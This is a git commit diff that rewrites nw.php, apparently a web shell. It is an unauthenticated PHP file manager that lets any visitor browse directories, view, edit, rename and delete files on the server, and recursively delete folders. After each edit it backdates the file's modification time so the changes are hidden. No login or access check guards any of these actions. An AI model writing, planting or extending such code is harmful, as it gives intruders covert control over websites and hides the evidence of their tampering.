632d003aa4c78d8c5650a6ffc16a1a491a95bac0
rabbitx1337 <72482820+rabbitx1337@users.noreply.github.com>
2020-12-24 15:16:52 +0700

    Update nw.php

--- nw.php
+++ nw.php
@@ -1,159 +1,219 @@
-<style type="text/css">
-	body {
-		overflow: hidden;
-	}
-	iframe {
-		overflow: auto;
-	}
-</style>
 <?php
-function files($path) {
-	$message = null;
-	$dnum = 0;
-	$fnum = 0;
-	if (!empty($_POST['file'])) {
-		$intime = @strtotime($_POST['ftime']);
-		$message = fwritte($_POST['file'], $_POST['data'], 'wb') ? 
-					'edit file' .$_POST['file']. 'success' : 
-					'edit file' .$_POST['file']. 'failed';
-		@touch($_POST['file'], $intime);
-	}
-	?>
-	<script type="text/javascript">
-		
-	</script>
-	<?php
-	print($message);
-	foreach (scandir($path) as $key => $value) {
-		if (is_dir($value)) {
-			?>
-			<a href="?action=filemanager&path=<?= getcwd() .'/'. $value ?>"><?= $value ?></a><br>
-			<?php
+// regex => files(dir, '/\.html$/')
+date_default_timezone_set("Asia/Jakarta");
+function files($type, $relativePath = false, $pattern = '', $result = array()) {
+	$result = [];
+	foreach (scandir(getcwd()) as $key => $value) {
+		$file['name'] = getcwd().DIRECTORY_SEPARATOR.$value;
+		switch ($type) {
+			case 'dir':
+				if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
+					$result[] = $file;
+				break;
+			
+			case 'file':
+				if (!is_file($file['name'])) continue 2;
+					if(empty($pattern) || preg_match($pattern, $file['name'])) $result[] = $file;
+				break;
 		}
-	}
-	foreach (scandir($path) as $key => $value) {
-		if (is_file($value)) {
-			?>
-			<a href="?action=edit&dir=<?=getcwd()?>&filename=<?=$value?>"><?=$value?></a> <br>
-			<?php
-		}
-	}
+	} return $result;
 }
-function freadd($filename) {
-	return file_get_contents($filename);
+function redirect($url) {
+	return '<meta http-equiv="refresh" content="0; url='.$url.'>';
 }
-function fwritte($filename, $data, $fmode) {
-	$key = true;
-	$handle = fopen($filename, $fmode);
-	if (!@fwrite($handle, $data)) {
-		@chmod($filename, 0666);
-		$key = @fwrite($handle, $data) ? true : false;
-	}
-	fclose($handle);
-	return $key;
+function home_root() {
+	return $_SERVER['DOCUMENT_ROOT'];
 }
-function fedit($path, $filename, $dim ='') {
-	$thispath = urlencode($path);
-	$thisfile = $path . DIRECTORY_SEPARATOR . $filename;
-	if (file_exists($thisfile)) {
-		$ftime = @date("Y-m-d H:i:s", filemtime($thisfile));
-		$fcode = htmlspecialchars(freadd($thisfile));
-	} else {
-		$ftime = date("Y-m-d H:i:s", time());
-		$fcode = '';
-	}
-	?>
-	<script language="javascript">
-		var NS4 = (document.layers);
-		var IE4 = (document.all);
-		var win = this;
-		var n = 0;
-		function search(str){
-			var txt, i, found;
-			if(str == "")return false;
-			if(NS4){
-				if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
-				if(n == 0) alert(str + " ... Not-Find")
+function countdir($dir) {
+	return @count(scandir($dir)) - 2;
+}
+function delete($filename) {
+	if (is_dir($filename)) {
+		foreach (scandir($filename) as $key => $value) {
+			if ($value != '.' && $value != '..') {
+				if (is_dir($filename.DIRECTORY_SEPARATOR.$value)) {
+					delete($filename.DIRECTORY_SEPARATOR.$value);
+				} else {
+					@unlink($filename.DIRECTORY_SEPARATOR.$value);
+				}
 			}
-			if(IE4) {
-				txt = win.document.body.createTextRange();
-				for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
-					txt.moveStart("character", 1);
-					txt.moveEnd("textedit")
-				}	
-				if(found){
-					txt.moveStart("character", -1);
-					txt.findText(str);
-					txt.select();
-					txt.scrollIntoView();
-					n++
-				}
-				else { 
-					if (n > 0) {
-						n = 0;
-						search(str)
-					}
-					else 
-						alert(str + "... Not-Find")
-				}
-			} 
-			return false
-		}
-		function CheckDate(){
-			var re = document.getElementById('ftime').value;
-			var reg = "/^(d{1,4})(-|/)(d{1,2})2(d{1,2}) (d{1,2}):(d{1,2}):(d{1,2})$/"; 
-			var r = re;
-			if(r==null) {
-				alert('Date format is incorrect! Format:yyyy-mm-dd hh:mm:ss');
+			if (@rmdir($filename)) {
+				return true;
+			} else {
 				return false;
 			}
-			else {
-				document.getElementById('editor').submit();
-			}
 		}
-	</script>
-	<input name="searchs" type="text" value="<?=$dim?>">
-	<input type="button" value="search" onclick="search(searchs.value)">
-	<form method="POST" id="editor" action="?action=filemanager&path=<?=$thisfile?>">
-		<input type="text" name="file" value="<?=$thisfile?>">
-		<textarea name="data" id><?=$fcode?></textarea>
-		File modification time 
-		<input type="text" name="ftime" id="ftime" value="<?= $ftime ?>">
-		<input type="button" value="save" onclick="CheckDate();">
-		<input type="button" value="back" onclick="window.location='?s=a&p={$THIS_DIR}';">
-	</form>
-	<?php
+	} else {
+		if (@unlink($filename)) {
+			return true;
+		} else {
+			return false;
+		}
+	}
 }
-function home() {
-	?>
-	<script type="text/javascript">
-		function switchtab(tab) {
-			if (tab =='') return false;
-			for (var i = 1; i <= 10; i++) {
-				if (tab == 'tab' +i) {
-					document.getElementById(tab).style.background = '#fff';
-				} else {
-					document.getElementById(tab).style.background = '#000';
-				} return true;
-			}
-	</script>
-		<a href="?action=filemanager" id="tab1" onclick="switchtab('tab1')" target="main">Filemanager</a>
-	<iframe name="main" src="?action=filemanager" width="100%" height="100%" frameborder="0"></iframe>
-	<?php
+function fsize($filename) {
+	if (is_file($filename)) {
+		$filepath = $filename;
+		if (!realpath($filepath)) {
+			$filepath = home_root().$filepath;
+		}
+		$fsize = filesize($filepath);
+		$array = [" TB"," GB"," MB"," KB"," Byte"];
+		$total = count($array);
+		while ($total -- && $fsize > 1024) {
+			$fsize /= 1024; 
+		} return round($fsize, 2)."".$array[$total];
+	} else {
+		return countdir($filename). " items";
+	}
 }
-if (isset($_GET['path'])) {
-	@chdir($_GET['path']);
+function ftime($filename) {
+	return date("d/m/Y H:i:s", @filemtime($filename));
 }
-
-switch (@$_GET['action']) {
-	case 'filemanager':
-		files(getcwd());
-		break;
-	case 'edit':
-		fedit($_GET['dir'], $_GET['filename']);
-		break;
-	default:
-		home();
-		break;
+function freadf($filename) {
+	return htmlspecialchars(file_get_contents($filename));
+}
+function frename($filename, $newname) {
+	return rename($filename, getcwd().DIRECTORY_SEPARATOR.$newname);
+}
+function fedit($filename, $data) {
+	$key = true;
+	$handle = fopen($filename, "wb");
+	if (!@fwrite($handle, $data)) {
+		@chmod($filename, "0666");
+		$key = @fwrite($handle, $data) ? true : false;
+	} fclose($handle);
+	return $key;
+}
+if (isset($_GET['cd'])) {
+	@chdir($_GET['cd']);
 }
 ?>
+<table>
+	<?php
+	switch (@$_POST['action']) {
+		case 'fraw':
+			?>
+			<pre><?= freadf($_POST['file']) ?></pre>
+			<?php
+			exit();
+			break;
+	
+		case 'fedit':
+			if (isset($_POST['submit'])) {
+				$message = null;
+				if (!empty($_POST['file'])) {
+					if (fedit($_POST['file'], $_POST['data'])) {
+						print("saved");
+						@touch($_POST['file'], @strtotime($_POST['ftime']));
+					} else {
+						print("failed to saved");
+					}
+				}
+			}
+			?>
+			<tr>
+				<td>
+					Filename : <?= $_POST['file'] ?>
+				</td>
+			</tr>
+			<tr>
+			<form method="post">
+				<td>
+					Last Modified : <input type="text" name="ftime" value="<?= ftime($_POST['file']) ?>">
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<textarea name="data"><?= freadf($_POST['file']) ?></textarea>
+				</td>
+			</tr>
+				<tr>
+					<td>
+						<input type="hidden" name="action" value="fedit">
+						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+						<input type="submit" name="submit" value="save">
+					</td>
+				</tr>
+			</form>
+			<?php
+			exit();
+			break;
+		case 'frename':
+			if (isset($_POST['submit'])) {
+				if (frename($_POST['file'], $_POST['newname'])) {
+					redirect("?cd=".getcwd()."");
+					@touch($_POST['file'], @strtotime($_POST['ftime']));
+					delete($_POST['file']);
+				} else {
+					print("rename failed");
+				}
+			}
+			?>
+			<form method="post">
+				<tr>
+					<td>
+						<input type="hidden" name="action" value="frename">
+						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+						<input type="hidden" name="ftime" value="<?= ftime($_POST['file']) ?>">
+						<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+					</td>
+					<td>
+						<input type="submit" name="submit" value="rename">
+					</td>
+				</tr>
+			</form>
+			<?php
+			break;
+		case 'fdelete':
+			delete($_POST['file']);
+			break;
+	}
+	?>
+	<tr>
+		<th>Name</th>
+		<th>Size</th>
+		<th>Last Modified</th>
+		<th>Action</th>
+	</tr>
+	<?php
+	foreach (files('dir') as $key => $value) { ?>
+		<tr>
+			<td>
+				<a href="?cd=<?= $value['name'] ?>"><?= basename($value['name']) ?></a>
+			</td>
+			<td>
+				<?= fsize($value['name']) ?>
+			</td>
+			<td>
+				<?= ftime($value['name']) ?>
+			</td>
+			<td></td>
+		</tr>
+	<?php }
+	foreach (files('file') as $key => $value) { ?>
+		<tr>
+			<form method="post" action="#raw=<?= $value['name'] ?>" target="_blank">
+				<td>
+					<input type="hidden" name="file" value="<?= $value['name'] ?>">
+					<button name="action" value="fraw"><?= basename($value['name']) ?></button>
+				</td>
+			</form>
+			<td>
+				<?= fsize($value['name']) ?>
+			</td>
+			<td>
+				<?= ftime($value['name']) ?>
+			</td>
+			<form method="post">
+				<td>
+					<input type="hidden" name="file" value="<?= $value['name'] ?>">
+					<button name="action" value="fedit">Edit</button>
+					<button name="action" value="frename">Rename</button>
+					<button name="action" value="fdelete">Delete</button>
+				</td>
+			</form>
+		</tr>
+	<?php }
+	?>
+</table>
